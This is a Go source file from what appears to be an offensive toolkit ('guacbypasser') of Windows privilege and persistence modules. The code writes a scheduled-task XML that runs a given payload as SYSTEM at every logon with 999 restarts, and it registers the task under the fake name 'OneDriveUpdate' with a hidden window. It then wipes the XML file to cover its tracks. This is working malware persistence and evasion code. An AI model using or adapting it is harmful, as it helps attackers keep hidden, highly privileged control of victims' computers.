package guacbypasser

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"syscall"
	"time"
)

func w32_nt_persistence_schtasks(p string) (error, Informer) {
	inf := Informer{
		Name: "schtasks",
		Desc: "Gain persistence with system privilege using schtasks",
		Id:   7,

		Type:   "Persistence",
		Module: "w32_nt_persistence_schtasks",

		Fixed:   false,
		FixedIn: "",

		Admin:   true,
		Payload: true,
	}

	fPath, err := filepath.Abs(p)
	if err != nil {
		return err, inf
	}

	// XML Template for HighestAvailable priviligue ...
	var xmlTemplate = fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
	<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
	  <RegistrationInfo>
		<Date>2018-06-09T15:45:11.0109885</Date>
		<Author>000000000000000000</Author>
		<URI>\Microsoft\Windows\OneDriveUpdate</URI>
	  </RegistrationInfo>
	  <Triggers>
		<LogonTrigger>
		  <Enabled>true</Enabled>
		</LogonTrigger>
	  </Triggers>
	  <Principals>
		<Principal id="Author">
		  <UserId>S-1-5-18</UserId>
		  <RunLevel>HighestAvailable</RunLevel>
		</Principal>
	  </Principals>
	  <Settings>
		<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
		<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
		<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
		<AllowHardTerminate>false</AllowHardTerminate>
		<StartWhenAvailable>true</StartWhenAvailable>
		<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
		<IdleSettings>
		  <StopOnIdleEnd>true</StopOnIdleEnd>
		  <RestartOnIdle>false</RestartOnIdle>
		</IdleSettings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		<Hidden>false</Hidden>
		<RunOnlyIfIdle>false</RunOnlyIfIdle>
		<WakeToRun>false</WakeToRun>
		<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
		<Priority>7</Priority>
		<RestartOnFailure>
		  <Interval>PT2H</Interval>
		  <Count>999</Count>
		</RestartOnFailure>
	  </Settings>
	  <Actions Context="Author">
		<Exec>
		  <Command>%s</Command>
		</Exec>
	  </Actions>
	</Task>`, fmt.Sprintf("start %s", fPath))

	// must be realize in future !
	/*_ = [26]uintptr{
		0x98ef, 0x2322bb, 0x053, 0x075, 0x11dfe,
		0x912d, 0x08f, 0x32ce, 0x562ee, 0x0cc,
		0x023ff, 0xff, 0x098cbe, 0x0cbe, 0x0,
		0x0, 0x02, 0x13d, 0x013e, 0x86eff,
		0x0be, 0x0bb, 0x2833bee, 0x06453cc, 0x0, 0x0EADBEEF,
	}*/

	if err := ioutil.WriteFile(
		(os.Getenv("APPDATA") + ("\\elevator.xml")), []byte(xmlTemplate), 0666,
	); err != nil {
		return err, inf
	}

	cmd := newCmd(
		fmt.Sprintf("schtasks /create /xml %s /tn OneDriveUpdate",
			fmt.Sprintf("%s\\elevator.xml", os.Getenv("APPDATA")),
		),
	)
	cmd.exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if _, err = cmd.exec.Output(); err != nil {
		return err, inf
	}

	// Sleep for 3 seconds.
	time.Sleep(3 * time.Second)

	if err := newWiper(os.Getenv("APPDATA") + "\\elevator.xml"); err != nil {
		return err, inf
	}
	return nil, inf
}

// NewPersistenceSCHTASKS #add-some-info-please
func NewPersistenceSCHTASKS(p string) (error, Informer) { return w32_nt_persistence_schtasks(p) }
